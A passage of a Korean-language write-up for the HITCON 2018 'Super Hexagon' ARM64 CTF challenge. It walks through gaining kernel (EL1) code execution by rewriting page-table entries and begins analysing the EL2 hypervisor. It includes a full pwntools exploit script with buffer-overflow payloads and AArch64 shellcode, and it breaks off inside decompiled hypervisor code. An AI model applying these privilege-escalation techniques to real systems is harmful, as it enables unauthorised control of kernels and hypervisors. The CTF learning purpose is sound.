<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-Python" data-lang="Python"><span style="display:flex;"><span>     fffc000000c <span style="color:#ae81ff">20</span>  <span style="color:#ae81ff">20</span>  <span style="color:#ae81ff">18</span>  d5    msr        ttbr1_el1 ,x0
</span></span><span style="display:flex;"><span>     fffc0000010 <span style="color:#ae81ff">00</span>  <span style="color:#ae81ff">02</span>  <span style="color:#ae81ff">80</span>  d2    mov        x0,<span style="color:#75715e">#0x10</span>
</span></span><span style="display:flex;"><span>     fffc0000014 <span style="color:#ae81ff">00</span>  <span style="color:#ae81ff">02</span>  b0  f2    movk       x0,<span style="color:#75715e">#0x8010 , LSL #16</span>
</span></span><span style="display:flex;"><span>     fffc0000018 <span style="color:#ae81ff">00</span>  <span style="color:#ae81ff">0</span>c  c0  f2    movk       x0,<span style="color:#75715e">#0x60 , LSL #32</span>
</span></span><span style="display:flex;"><span>     fffc000001c <span style="color:#ae81ff">40</span>  <span style="color:#ae81ff">20</span>  <span style="color:#ae81ff">18</span>  d5    msr        tcr_el1 ,x0
</span></span><span style="display:flex;"><span>     fffc0000020 df  <span style="color:#ae81ff">3</span>f  <span style="color:#ae81ff">03</span>  d5    isb
</span></span><span style="display:flex;"><span>     fffc0000024 <span style="color:#ae81ff">00</span>  <span style="color:#ae81ff">10</span>  <span style="color:#ae81ff">38</span>  d5    mrs        x0,sctlr_el1
</span></span><span style="display:flex;"><span>     fffc0000028 <span style="color:#ae81ff">00</span>  <span style="color:#ae81ff">00</span>  <span style="color:#ae81ff">40</span>  b2    orr        x0,x0,<span style="color:#75715e">#0x1</span>
</span></span><span style="display:flex;"><span>     fffc000002c <span style="color:#ae81ff">00</span>  <span style="color:#ae81ff">10</span>  <span style="color:#ae81ff">18</span>  d5    msr        sctlr_el1 ,x0
</span></span><span style="display:flex;"><span>     fffc0000030 df  <span style="color:#ae81ff">3</span>f  <span style="color:#ae81ff">03</span>  d5    isb
</span></span><span style="display:flex;"><span>     fffc0000034 e0  <span style="color:#ae81ff">87</span>  <span style="color:#ae81ff">62</span>  b2    orr        x0,xzr ,<span style="color:#75715e">#-0x40000000</span>
</span></span><span style="display:flex;"><span>     fffc0000038 <span style="color:#ae81ff">41</span>  fe  <span style="color:#ae81ff">03</span>  <span style="color:#ae81ff">10</span>    adr        x1,<span style="color:#f92672">-</span><span style="color:#ae81ff">0x3fff8000</span>
</span></span><span style="display:flex;"><span>     fffc000003c <span style="color:#ae81ff">00</span>  <span style="color:#ae81ff">00</span>  <span style="color:#ae81ff">01</span>  <span style="color:#ae81ff">8</span>b    add        x0,x0,x1
</span></span><span style="display:flex;"><span>     fffc0000040 <span style="color:#ae81ff">00</span>  <span style="color:#ae81ff">00</span>  <span style="color:#ae81ff">1</span>f  d6    br         x0<span style="color:#f92672">=&gt;</span>LAB_ffffffff80008000
</span></span></code></pre></div><p>어차피 TTBR1_EL1 바꾸면 두 번째 VA가 TTBR1 타고 변환하니 fault 안만들고 그냥 안정적으로 임의 코드 실행을 달성할 수 있을 것 같다.
근데 유저랜드에서 fake page table 만들려면 4kb 이상의 방대한 메모리가 필요하고, 하나 하나 다시 써야한다.</p>
<p>그래서 read로 EL1의 PTE를 덮어서 IPA를 바꿔주는 것을 선택했다.
아니면 유저쪽 PXN 비트를 떨구고 거기로 뛰어도 된다고 한다.
그게 더 간단하지만 풀 때는 그 생각을 못했다.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-Python" data-lang="Python"><span style="display:flex;"><span><span style="color:#f92672">&gt;&gt;&gt;</span> int(bin(<span style="color:#ae81ff">0xffffffffc001e000</span>)[<span style="color:#ae81ff">2</span>:][::<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>][<span style="color:#ae81ff">12</span>:<span style="color:#ae81ff">21</span>][::<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>],<span style="color:#ae81ff">2</span>)
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">30</span>
</span></span></code></pre></div><p><img loading="lazy" src="/blog/Hitcon_2018_Superhexagon/9ae597d10a403510f7f9d3a4aa046a26.png" alt=""  />

0xffffffffc001e000 -&gt; 0x1e000 -&gt; 0x4001e000로 변환되니까 저 부분을 수정하면 된다.</p>
<p>0x0040000000036483로 바꿔주면 미리 mmap 해놓은 유저 페이지를 실행하게 된다.
PTE 수정하려면 2바이트가 필요한데 read는 한번에 1바이트씩만 쓸 수 있다.
1바이트만 달라져도 qemu에서 tlb 자체를 완전한 환경에 맞춰 구현하지 않아 바로 fault가 발생한다.</p>
<p>그래서 저 페이지 테이블 자체를 가리키는 descriptor의 AP를 변경해서 EL0에서 RW를 만들었다.
그리고 EL0에서 8바이트 전체를 써주는 방식으로 진행하면 될것 같았다.
mprotect R-X를 해줘야 EL2 MMU에 변경된 execution 권한이 적용된다.
<img loading="lazy" src="/blog/Hitcon_2018_Superhexagon/36bbd4f063e15828882e79552c0a158f.png" alt=""  />

FEAT_XNX가 비활성화 상태이다.
page descriptor 53 bit가 res0이고 54bit가 EL0과 EL1에 대한 execution control을 담당한다.
EL2는 물리 메모리로 접근하고 손으로 pagewalk해서 확인해보았다.
<img loading="lazy" src="/blog/Hitcon_2018_Superhexagon/cb87a472465a0d95b35b3d83dc8ae180.png" alt=""  />

<img loading="lazy" src="/blog/Hitcon_2018_Superhexagon/b8826cfe88662b242971135546c83f11.png" alt=""  />

mprotect r-x 안했을때 stage 2 translation의 주체인 EL2의 page table에 EL0/1 execution이 비활성화 되었음을 알 수 있다.
bata24 gef를 이용하고 있는데 버그가 있다.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-Python" data-lang="Python"><span style="display:flex;"><span><span style="color:#ae81ff">1</span>) <span style="color:#ae81ff">0x0000000000034000</span><span style="color:#f92672">-</span><span style="color:#ae81ff">0x0000000000037000</span>  <span style="color:#ae81ff">0x0000000040034000</span><span style="color:#f92672">-</span><span style="color:#ae81ff">0x0000000040037000</span>  <span style="color:#ae81ff">0x3000</span>        <span style="color:#ae81ff">0x1000</span>      <span style="color:#ae81ff">3</span>      [EL0<span style="color:#f92672">/</span>R<span style="color:#f92672">-</span>X EL1<span style="color:#f92672">/</span>R<span style="color:#f92672">-</span>X ACCESSED]
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">2</span>) <span style="color:#ae81ff">0x0000000000036000</span><span style="color:#f92672">-</span><span style="color:#ae81ff">0x000000000003b000</span>  <span style="color:#ae81ff">0x0000000040036000</span><span style="color:#f92672">-</span><span style="color:#ae81ff">0x000000004003b000</span>  <span style="color:#ae81ff">0x5000</span>       <span style="color:#ae81ff">0x1000</span>      <span style="color:#ae81ff">5</span>      [EL0<span style="color:#f92672">/</span>RWX EL1<span style="color:#f92672">/</span>RWX ACCESSED]
</span></span></code></pre></div><p>1번이 mprotect r-x 해줬을 때 gef가 보여주는 EL2 매핑이다.
2번이 mprotect 안해줬을 때 gef가 보여주는 EL2 매핑이다.
gef 코드를 보니 따로 WXN는 신경을 쓰는데, FEAT_XNX는 stage 2라서 그런지 따로 확인하지 않는다.
실제로 2번은 EL2에서 RWX가 아니라 RW로 봐야한다.</p>
<h2 id="exploit-code-code-execution-1">Exploit code (code execution)<a hidden class="anchor" aria-hidden="true" href="#exploit-code-code-execution-1">#</a></h2>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-Python" data-lang="Python"><span style="display:flex;"><span><span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">from</span> keystone <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
</span></span><span style="display:flex;"><span>sla <span style="color:#f92672">=</span> <span style="color:#66d9ef">lambda</span> x,y : p<span style="color:#f92672">.</span>sendlineafter(x,y)
</span></span><span style="display:flex;"><span>sa <span style="color:#f92672">=</span> <span style="color:#66d9ef">lambda</span> x,y : p<span style="color:#f92672">.</span>sendafter(x,y)
</span></span><span style="display:flex;"><span>context<span style="color:#f92672">.</span>binary <span style="color:#f92672">=</span> e <span style="color:#f92672">=</span> ELF(<span style="color:#e6db74">&#39;./super_hexagon/share/_bios.bin.extracted/BC010&#39;</span>)
</span></span><span style="display:flex;"><span>ks <span style="color:#f92672">=</span> Ks(KS_ARCH_ARM64,KS_MODE_LITTLE_ENDIAN)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>sc_st <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x7ffeffffd006</span>
</span></span><span style="display:flex;"><span>shellcode <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;&#39;</span>
</span></span><span style="display:flex;"><span>shellcode <span style="color:#f92672">+=</span> bytes(ks<span style="color:#f92672">.</span>asm(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#39;&#39;&#39;</span><span style="color:#ae81ff">\
</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff"></span><span style="color:#e6db74">    mov x5, #-1
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    mov w4, #0x0
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    mov w3, #0x0
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    mov w2, #3
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    mov x1, #0x1000
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    mov x0, #0x0
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    mov x8, #0xde
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    svc #0x1337
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    mov x11, x0
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    mov w9, #0x0
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    loop:                   
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">        add x1, x11, x9
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">        mov x8, #0x3f
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">        mov x0, #0
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">        mov x2, #0x1
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">        svc #0x1337
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">        add w9, w9, #1
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">        cmp x9, #0x1000
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">        bne loop
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    mov x0, x11
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    mov x1, #0x1000
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    mov x2, #5
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    mov x8, #0xe2
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    svc #0x1337
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    blr x11
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">&#39;&#39;&#39;</span>)[<span style="color:#ae81ff">0</span>])
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">assert</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\r</span><span style="color:#e6db74">&#39;</span> <span style="color:#f92672">not</span> <span style="color:#f92672">in</span> shellcode <span style="color:#f92672">and</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\x0a</span><span style="color:#e6db74">&#39;</span> <span style="color:#f92672">not</span> <span style="color:#f92672">in</span> shellcode
</span></span><span style="display:flex;"><span>p <span style="color:#f92672">=</span> remote(<span style="color:#e6db74">&#39;localhost&#39;</span>,<span style="color:#ae81ff">6666</span>)
</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;A&#39;</span> <span style="color:#f92672">*</span> <span style="color:#ae81ff">0x100</span>
</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">+=</span> p64(<span style="color:#ae81ff">0xdeadbeef</span>) 
</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">+=</span> p64(e<span style="color:#f92672">.</span>sym<span style="color:#f92672">.</span>gets) <span style="color:#75715e"># cmd = 1</span>
</span></span><span style="display:flex;"><span>sla(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;cmd&gt; &#39;</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;1&#39;</span>)
</span></span><span style="display:flex;"><span>sla(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;index: &#39;</span>, str(<span style="color:#ae81ff">0</span>))
</span></span><span style="display:flex;"><span>sla(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;key: &#39;</span>, payload)
</span></span><span style="display:flex;"><span>sleep(<span style="color:#ae81ff">0.1</span>)
</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;A&#39;</span> <span style="color:#f92672">*</span> <span style="color:#ae81ff">0b101</span> <span style="color:#f92672">+</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\x00</span><span style="color:#e6db74">&#39;</span>
</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">+=</span> shellcode
</span></span><span style="display:flex;"><span>p<span style="color:#f92672">.</span>sendline(payload)
</span></span><span style="display:flex;"><span>sla(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;cmd&gt; &#39;</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;1&#39;</span>)
</span></span><span style="display:flex;"><span>sla(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;index: &#39;</span>, str(<span style="color:#ae81ff">0x1000</span>))
</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;&#39;</span>
</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">+=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;A&#39;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">0b101</span> <span style="color:#f92672">+</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\x00</span><span style="color:#e6db74">&#39;</span>
</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">+=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;A&#39;</span><span style="color:#f92672">*</span>(<span style="color:#ae81ff">0x100</span> <span style="color:#f92672">-</span> len(payload))
</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">+=</span> p64(<span style="color:#ae81ff">0xdeadbeef</span>)
</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">+=</span> p64(e<span style="color:#f92672">.</span>sym<span style="color:#f92672">.</span>mprotect)
</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">+=</span> p64(sc_st)
</span></span><span style="display:flex;"><span>sla(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;key: &#39;</span>, payload)
</span></span><span style="display:flex;"><span>sla(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;cmd&gt; &#39;</span>,<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;2&#39;</span>)
</span></span><span style="display:flex;"><span>sla(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;index: &#39;</span>, str(<span style="color:#ae81ff">1</span>))
</span></span><span style="display:flex;"><span>sleep(<span style="color:#ae81ff">0.1</span>)
</span></span><span style="display:flex;"><span>entry <span style="color:#f92672">=</span> <span style="color:#ae81ff">0xffffffffc001e000</span> <span style="color:#f92672">+</span> <span style="color:#ae81ff">0xf0</span> 
</span></span><span style="display:flex;"><span>addr <span style="color:#f92672">=</span> <span style="color:#ae81ff">0xffffffffc00091b8</span>
</span></span><span style="display:flex;"><span>UART<span style="color:#f92672">=</span> <span style="color:#ae81ff">0xffffffffc9000000</span>
</span></span><span style="display:flex;"><span>EL1_shellcode <span style="color:#f92672">=</span> asm(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#39;nop&#39;</span>)<span style="color:#f92672">*</span>(<span style="color:#ae81ff">0x400</span><span style="color:#f92672">//</span><span style="color:#ae81ff">4</span>)
</span></span><span style="display:flex;"><span>EL1_shellcode <span style="color:#f92672">+=</span> asm(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#39;&#39;&#39;</span><span style="color:#ae81ff">\
</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff"></span><span style="color:#e6db74">movz x11, #</span><span style="color:#e6db74">{</span>((UART)<span style="color:#f92672">&gt;&gt;</span><span style="color:#ae81ff">48</span>)<span style="color:#f92672">&amp;</span><span style="color:#ae81ff">0xffff</span><span style="color:#e6db74">}</span><span style="color:#e6db74">, lsl #48
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">movk x11, #</span><span style="color:#e6db74">{</span>((UART)<span style="color:#f92672">&gt;&gt;</span><span style="color:#ae81ff">32</span>)<span style="color:#f92672">&amp;</span><span style="color:#ae81ff">0xffff</span><span style="color:#e6db74">}</span><span style="color:#e6db74">, lsl #32
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">movk x11, #</span><span style="color:#e6db74">{</span>((UART)<span style="color:#f92672">&gt;&gt;</span><span style="color:#ae81ff">16</span>)<span style="color:#f92672">&amp;</span><span style="color:#ae81ff">0xffff</span><span style="color:#e6db74">}</span><span style="color:#e6db74">, lsl #16
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">movk x11, #</span><span style="color:#e6db74">{</span>(UART)<span style="color:#f92672">&amp;</span><span style="color:#ae81ff">0xffff</span><span style="color:#e6db74">}</span><span style="color:#e6db74">, lsl #0
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">mov x0, #0x31
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">strb w0, [x11]
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">ret
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">&#39;&#39;&#39;</span>)
</span></span><span style="display:flex;"><span>cnt <span style="color:#f92672">=</span> len(EL1_shellcode)
</span></span><span style="display:flex;"><span>val <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x0040000000036483</span>
</span></span><span style="display:flex;"><span>shellcode <span style="color:#f92672">=</span> <span style="color:#e6db74">f</span><span style="color:#e6db74">&#39;&#39;&#39;</span><span style="color:#ae81ff">\
</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff"></span><span style="color:#e6db74">    mov x5, #-1
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    mov w4, #0x0
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    mov w3, #0x0
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    mov w2, #3
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    mov x1, #0x1000
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    mov x0, #0x0
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    mov x8, #0xde
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    svc #0x1337
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    mov x11, x0 // IPA 0x36000
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    mov x9, #0x0 
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    loop:                   
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">        add x1, x11, x9
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">        mov x8, #0x3f
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">        mov x0, #0
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">        mov x2, #0x1
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">        svc #0x1337
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">        add w9, w9, #1
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">        cmp x9, #</span><span style="color:#e6db74">{</span>cnt<span style="color:#e6db74">}</span><span style="color:#e6db74">
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">        bne loop
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    mov x0, x11
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    mov x1, #0x1000
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    mov x2, #5 // r-x
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    mov x8, #0xe2
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    svc #0x1337
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    movz x11, #</span><span style="color:#e6db74">{</span>((entry)<span style="color:#f92672">&gt;&gt;</span><span style="color:#ae81ff">48</span>)<span style="color:#f92672">&amp;</span><span style="color:#ae81ff">0xffff</span><span style="color:#e6db74">}</span><span style="color:#e6db74">, lsl #48
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    movk x11, #</span><span style="color:#e6db74">{</span>((entry)<span style="color:#f92672">&gt;&gt;</span><span style="color:#ae81ff">32</span>)<span style="color:#f92672">&amp;</span><span style="color:#ae81ff">0xffff</span><span style="color:#e6db74">}</span><span style="color:#e6db74">, lsl #32
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    movk x11, #</span><span style="color:#e6db74">{</span>((entry)<span style="color:#f92672">&gt;&gt;</span><span style="color:#ae81ff">16</span>)<span style="color:#f92672">&amp;</span><span style="color:#ae81ff">0xffff</span><span style="color:#e6db74">}</span><span style="color:#e6db74">, lsl #16
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    movk x11, #</span><span style="color:#e6db74">{</span>(entry)<span style="color:#f92672">&amp;</span><span style="color:#ae81ff">0xffff</span><span style="color:#e6db74">}</span><span style="color:#e6db74">, lsl #0
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    mov x0, #0
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    mov x1, x11
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    mov x8, #0x3f
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    mov x2, #1
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    svc #0x1337 // now we can modify the kernel page table
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    movz x10, #</span><span style="color:#e6db74">{</span>((val)<span style="color:#f92672">&gt;&gt;</span><span style="color:#ae81ff">48</span>)<span style="color:#f92672">&amp;</span><span style="color:#ae81ff">0xffff</span><span style="color:#e6db74">}</span><span style="color:#e6db74">, lsl #48
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    movk x10, #</span><span style="color:#e6db74">{</span>((val)<span style="color:#f92672">&gt;&gt;</span><span style="color:#ae81ff">32</span>)<span style="color:#f92672">&amp;</span><span style="color:#ae81ff">0xffff</span><span style="color:#e6db74">}</span><span style="color:#e6db74">, lsl #32
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    movk x10, #</span><span style="color:#e6db74">{</span>((val)<span style="color:#f92672">&gt;&gt;</span><span style="color:#ae81ff">16</span>)<span style="color:#f92672">&amp;</span><span style="color:#ae81ff">0xffff</span><span style="color:#e6db74">}</span><span style="color:#e6db74">, lsl #16
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    movk x10, #</span><span style="color:#e6db74">{</span>(val)<span style="color:#f92672">&amp;</span><span style="color:#ae81ff">0xffff</span><span style="color:#e6db74">}</span><span style="color:#e6db74">, lsl #0
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    sub x11, x11, #0xa0
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    str x10, [x11]
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    mov x8, #0x123
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    svc #0x1337
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">&#39;&#39;&#39;</span>
</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">=</span> bytes(ks<span style="color:#f92672">.</span>asm(shellcode)[<span style="color:#ae81ff">0</span>])
</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">+=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\x41</span><span style="color:#e6db74">&#39;</span> <span style="color:#f92672">*</span> (<span style="color:#ae81ff">0x1000</span> <span style="color:#f92672">-</span> len(payload))
</span></span><span style="display:flex;"><span>p<span style="color:#f92672">.</span>send(payload)
</span></span><span style="display:flex;"><span>sleep(<span style="color:#ae81ff">0.1</span>)
</span></span><span style="display:flex;"><span>p<span style="color:#f92672">.</span>send(EL1_shellcode)
</span></span><span style="display:flex;"><span>pause()
</span></span><span style="display:flex;"><span>p<span style="color:#f92672">.</span>send(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\x43</span><span style="color:#e6db74">&#39;</span>) <span style="color:#75715e"># AP 01 -&gt; EL0 RW EL1 RW </span>
</span></span><span style="display:flex;"><span>p<span style="color:#f92672">.</span>interactive()
</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#39;&#39;&#39;[+] LEVEL0_BIT_RANGE: [39, 48]
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">[+] LEVEL1_BIT_RANGE: [30, 39]
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">[+] LEVEL2_BIT_RANGE: [21, 30]
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">[+] LEVEL3_BIT_RANGE: [12, 21]
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">[+] OFFSET_BIT_RANGE: [0, 12]
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">x/40xg 0xffffffffc0000000 + 0x28000  + 8*506&#39;&#39;&#39;</span>
</span></span></code></pre></div><p>테스트를 위해 1을 계속 찍는 쉘코드를 넣었다.</p>
<h1 id="el2-virtual-machine-monitor">EL2, Virtual machine monitor<a hidden class="anchor" aria-hidden="true" href="#el2-virtual-machine-monitor">#</a></h1>
<p><img loading="lazy" src="/blog/Hitcon_2018_Superhexagon/d76290c15ec8a1ecf6278e71e4688965.png" alt=""  />

커널까지 공격했으니 이제 hypervisor를 공격해서 vm escape를 해서 Normal world를 모두 컨트롤할 수 있도록 만들어야한다.
원래 EL1에서 EL3로 secure monitor call을 하는것도 EL2를 거쳐서 처리되기 때문에 여기를 공격 타겟으로 잡아야한다.
이 문제에선 Type 1 hypervisor를 채택한 구조다.
<img loading="lazy" src="/blog/Hitcon_2018_Superhexagon/4681c70db1415e5680e82da836a4e1d3.png" alt=""  />

만약 Type 2 구조조였다면 공격 벡터를 추가적으로 저 highvisor 부분으로도 신경을 썼어야 하지 않았을까 생각한다.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-Python" data-lang="Python"><span style="display:flex;"><span>ulong FUN_401003d8(long <span style="color:#f92672">*</span>saved_reg)
</span></span><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span>  long lVar1;
</span></span><span style="display:flex;"><span>  ulong x1;
</span></span><span style="display:flex;"><span>  int EC_;
</span></span><span style="display:flex;"><span>  ulong EC;
</span></span><span style="display:flex;"><span>  long x0;
</span></span><span style="display:flex;"><span>  ulong ESR;
</span></span><span style="display:flex;"><span>  
</span></span><span style="display:flex;"><span>  ESR <span style="color:#f92672">=</span> esr_el2;
</span></span><span style="display:flex;"><span>  EC <span style="color:#f92672">=</span> ESR <span style="color:#f92672">&gt;&gt;</span> <span style="color:#ae81ff">26</span> <span style="color:#f92672">&amp;</span> <span style="color:#ae81ff">0x3f</span>;
</span></span><span style="display:flex;"><span>  x0 <span style="color:#f92672">=</span> <span style="color:#f92672">*</span>saved_reg;
</span></span><span style="display:flex;"><span>  x1 <span style="color:#f92672">=</span> saved_reg[<span style="color:#ae81ff">1</span>];
</span></span><span style="display:flex;"><span>  EC_ <span style="color:#f92672">=</span> (int)EC;
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> (EC_ <span style="color:#f92672">==</span> <span style="color:#ae81ff">0b00010110</span>) {
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (x0 <span style="color:#f92672">==</span> <span style="color:#ae81ff">1</span>) {
</span></span><span style="display:flex;"><span>      x1 <span style="color:#f92672">=</span> HVC_handler(x1,saved_reg[<span style="color:#ae81ff">2</span>],saved_reg[<span style="color:#ae81ff">2</span>],saved_reg[<span style="color:#ae81ff">3</span>]);
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">else</span> {
</span></span><span style="display:flex;"><span>      x0 <span style="color:#f92672">=</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>;
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">else</span> <span style="color:#66d9ef">if</span> (EC_ <span style="color:#f92672">==</span> <span style="color:#ae81ff">0b00010111</span>) {
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (x0 <span style="color:#f92672">==</span> <span style="color:#ae81ff">0x83000003</span>) {
</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">if</span> (x1 <span style="color:#f92672">&lt;</span> <span style="color:#ae81ff">0x3c001</span>) {
